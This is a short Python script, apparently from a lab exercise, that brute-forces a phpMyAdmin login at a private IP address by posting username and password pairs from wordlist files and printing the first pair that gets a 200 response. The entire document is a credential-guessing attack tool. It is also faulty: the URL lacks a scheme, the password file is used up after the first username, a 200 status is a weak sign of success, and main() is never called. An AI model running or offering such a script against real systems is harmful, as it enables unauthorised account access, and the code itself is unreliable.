import requests

def main():
    username_file = 'usernames.txt'
    password_file = 'passwords.txt'  

    with open(username_file, 'r') as usernames, open(password_file, 'r') as passwords:
        for username in usernames:
            username = username.strip()
            for password in passwords:
                password = password.strip()

                response = requests.post('192.168.50.101/phpMyAdmin', data={'username': username, 'password': password})
                if response.status_code == 200:
                    print('Login riuscito')
                    print('Username:', username)
                    print('Password:', password)
                    return

    print('Login non riuscito')
